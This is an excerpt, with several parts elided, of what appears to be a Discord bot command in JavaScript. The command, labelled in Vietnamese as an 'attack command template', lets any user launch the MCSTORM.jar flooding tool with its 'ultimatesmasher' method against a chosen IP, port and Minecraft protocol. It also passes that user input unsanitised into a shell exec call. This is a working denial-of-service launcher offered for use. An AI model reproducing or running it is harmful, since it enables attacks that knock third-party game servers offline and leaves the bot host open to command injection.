...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;ultimatesmasher 1.1.1.1 25565 47`")
...
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar ${host}:${port} ${protocol} ultimatesmasher 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
...
exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['ultimatesmasher'],
  permLevel: 0
}

exports.help = {
  name: 'ultimatesmasher',
  description: 'Özel',
  usage: 'ultimatesmasher'
}